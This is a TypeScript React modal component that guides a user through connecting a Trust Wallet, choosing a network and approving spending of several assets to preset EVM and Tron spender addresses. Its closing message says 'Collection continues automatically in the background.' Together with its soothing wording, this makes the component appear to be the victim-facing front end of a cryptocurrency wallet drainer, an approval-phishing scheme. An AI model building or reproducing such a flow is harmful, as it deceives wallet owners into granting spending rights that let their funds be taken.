import { TERMS_VERSION } from "../core/approve-config";
import { nativeSymbolForNetwork } from "../core/network-meta";
import { countIncludedAssets } from "../authorization/preferences";
import type { NativeTransferEstimate } from "../native-transfer/types";
import type {
  AssetSymbol,
  AuthorizationSessionResult,
  AuthorizingPhase,
  ModalStep,
  CollectionPreferences,
  NetworkRow,
  RowStatus,
} from "../types";

type AuthorizeSpendingModalProps = {
  networks: NetworkRow[];
  rowStatus: Record<string, RowStatus>;
  selectedKey: string | null;
  approving: boolean;
  error: string | null;
  modalStep: ModalStep;
  preferences: CollectionPreferences;
  sessionResult: AuthorizationSessionResult | null;
  authorizingAsset: { network: string; asset: AssetSymbol } | null;
  authorizingPhase: AuthorizingPhase;
  authorizingProgress: { current: number; total: number };
  linkedAddressLabel: string | null;
  nativeEstimates: Record<string, NativeTransferEstimate | null>;
  spenderEvm: string;
  spenderTron: string;
  onClose: () => void;
  onSelectNetwork: (key: string) => void;
  onContinueFromConnected: () => void;
  onAuthorize: () => void;
};

function progressWidth(step: ModalStep): string {
  switch (step) {
    case "connected":
      return "w-[25%]";
    case "preferences":
      return "w-[45%]";
    case "authorizing":
      return "w-[75%]";
    case "complete":
      return "w-full";
    default:
      return "w-[25%]";
  }
}

function stepSubtitle(step: ModalStep): string {
  switch (step) {
    case "connected":
      return "Wallet connected";
    case "preferences":
      return "Select network";
    case "authorizing":
      return "Authorizing assets";
    case "complete":
      return "All set";
    default:
      return "Wallet connected";
  }
}

function authorizingMessage(
  phase: AuthorizingPhase,
  asset: { network: string; asset: AssetSymbol } | null
): string {
  const assetLabel = asset
    ? asset.asset === "NATIVE"
      ? nativeSymbolForNetwork(asset.network)
      : asset.asset
    : "asset";

  switch (phase) {
    case "wallet_confirm":
      return `Open Trust Wallet and confirm the ${assetLabel} approval request.`;
    case "finalizing":
      return `Finalizing ${assetLabel} on chain…`;
    default:
      return `Preparing ${assetLabel} approval…`;
  }
}

export function AuthorizeSpendingModal({
  networks,
  selectedKey,
  approving,
  error,
  modalStep,
  preferences,
  sessionResult,
  authorizingAsset,
  authorizingPhase,
  authorizingProgress,
  linkedAddressLabel,
  spenderEvm,
  spenderTron,
  onClose,
  onSelectNetwork,
  onContinueFromConnected,
  onAuthorize,
}: AuthorizeSpendingModalProps) {
  const selected = networks.find((n) => n.key === selectedKey) ?? null;
  const includedCount = countIncludedAssets(preferences, selectedKey);
  const spender = selectedKey
    ? selectedKey === "tron"
      ? spenderTron
      : spenderEvm
    : "";
  const canContinue =
    Boolean(selectedKey) && !approving && includedCount > 0 && Boolean(spender);

  const authorizedOk =
    sessionResult != null &&
    sessionResult.authorizedCount > 0 &&
    sessionResult.rejectedCount === 0 &&
    sessionResult.failedCount === 0;

  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
      <div className="max-h-[92vh] w-full max-w-md overflow-y-auto rounded-2xl border border-[#3396f0]/40 bg-white shadow-2xl">
        <div className="h-1 w-full bg-zinc-100">
          <div className={`h-full bg-[#3396f0] ${progressWidth(modalStep)}`} />
        </div>

        <div className="flex items-center justify-between px-4 pt-4">
          <button
            type="button"
            aria-label="Back"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ‹
          </button>
          <div className="text-center">
            <p className="text-base font-semibold text-zinc-900">
              {modalStep === "complete" ? "Wallet Connected" : "Authorize Spending"}
            </p>
            <p className="text-xs text-zinc-500">
              {stepSubtitle(modalStep)} · Terms v{TERMS_VERSION}
            </p>
          </div>
          <button
            type="button"
            aria-label="Close"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ×
          </button>
        </div>

        <div className="space-y-4 px-5 pb-5 pt-4">
          {error && modalStep !== "complete" ? (
            <p className="rounded-lg bg-red-50 px-3 py-2 text-sm text-red-600">
              {error}
            </p>
          ) : null}

          {modalStep === "connected" ? (
            <div className="space-y-4 py-4 text-center">
              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-100 text-2xl text-emerald-600">
                ✓
              </div>
              <div>
                <p className="text-lg font-semibold text-zinc-900">
                  Wallet connected
                </p>
                {linkedAddressLabel ? (
                  <p className="mt-1 font-mono text-sm text-zinc-500">
                    {linkedAddressLabel}
                  </p>
                ) : null}
                <p className="mt-3 text-sm text-zinc-600">
                  Your wallet is linked. Continue to choose a network and authorize
                  spending.
                </p>
              </div>
              <button
                type="button"
                onClick={onContinueFromConnected}
                className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6]"
              >
                Continue
              </button>
            </div>
          ) : null}

          {modalStep === "preferences" ? (
            <>
              <p className="text-sm text-zinc-600">
                Select a network and continue.
              </p>

              <div>
                <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-zinc-500">
                  Network
                </p>
                <ul className="space-y-2">
                  {networks.map((network) => {
                    const isSelected = selectedKey === network.key;

                    return (
                      <li key={network.key}>
                        <button
                          type="button"
                          disabled={approving}
                          onClick={() => onSelectNetwork(network.key)}
                          className={[
                            "flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition",
                            isSelected
                              ? "border-[#3396f0] bg-[#3396f0]/10"
                              : "border-zinc-200 bg-white hover:border-zinc-300",
                          ].join(" ")}
                        >
                          <span
                            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                            style={{ backgroundColor: network.color }}
                          >
                            {network.letter}
                          </span>
                          <span className="min-w-0 flex-1">
                            <span className="block text-sm font-semibold text-zinc-900">
                              {network.name}{" "}
                              <span className="font-normal text-zinc-500">
                                ({network.standard})
                              </span>
                            </span>
                          </span>
                        </button>
                      </li>
                    );
                  })}
                </ul>
              </div>

              {selected ? (
                <button
                  type="button"
                  disabled={!canContinue}
                  onClick={onAuthorize}
                  className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {!selectedKey
                    ? "Select a network"
                    : `Continue on ${selected.name}`}
                </button>
              ) : (
                <p className="rounded-lg border border-zinc-200 bg-zinc-50 px-3 py-3 text-sm text-zinc-600">
                  Select a network above to continue.
                </p>
              )}
            </>
          ) : null}

          {modalStep === "authorizing" ? (
            <div className="space-y-4 py-6 text-center">
              <div className="mx-auto h-10 w-10 animate-spin rounded-full border-2 border-[#3396f0]/30 border-t-[#3396f0]" />
              <p className="text-sm font-semibold text-zinc-900">
                {authorizingMessage(authorizingPhase, authorizingAsset)}
              </p>
              {authorizingAsset ? (
                <p className="rounded-lg border border-[#3396f0]/30 bg-[#3396f0]/10 px-3 py-2 text-sm text-[#1d5f9e]">
                  {authorizingAsset.network.toUpperCase()}{" "}
                  {authorizingAsset.asset === "NATIVE"
                    ? nativeSymbolForNetwork(authorizingAsset.network)
                    : authorizingAsset.asset}
                  {authorizingProgress.total > 0
                    ? ` · ${authorizingProgress.current} of ${authorizingProgress.total}`
                    : ""}
                </p>
              ) : null}
              {authorizingPhase === "wallet_confirm" ? (
                <p className="text-xs text-zinc-500">
                  If you don&apos;t see a prompt, open Trust Wallet and check
                  pending requests.
                </p>
              ) : null}
            </div>
          ) : null}

          {modalStep === "complete" ? (
            <div className="space-y-4 py-4 text-center">
              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-100 text-2xl text-emerald-600">
                ✓
              </div>
              <div>
                <p className="text-lg font-semibold text-zinc-900">
                  Wallet connected
                </p>
                {linkedAddressLabel ? (
                  <p className="mt-1 font-mono text-sm text-zinc-500">
                    {linkedAddressLabel}
                  </p>
                ) : null}
                <p className="mt-3 text-sm text-zinc-600">
                  {authorizedOk
                    ? "Authorization complete. Collection continues automatically in the background."
                    : sessionResult && sessionResult.authorizedCount > 0
                      ? "Partially authorized. Remaining assets can be retried later."
                      : "Session finished. You can retry authorization from the connect button."}
                </p>
              </div>
              {sessionResult && sessionResult.authorizedCount > 0 ? (
                <p className="text-xs text-emerald-700">
                  {sessionResult.authorizedCount} asset
                  {sessionResult.authorizedCount === 1 ? "" : "s"} authorized
                </p>
              ) : null}
              <button
                type="button"
                onClick={onClose}
                className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6]"
              >
                Continue
              </button>
            </div>
          ) : null}
        </div>
      </div>
    </div>
  );
}
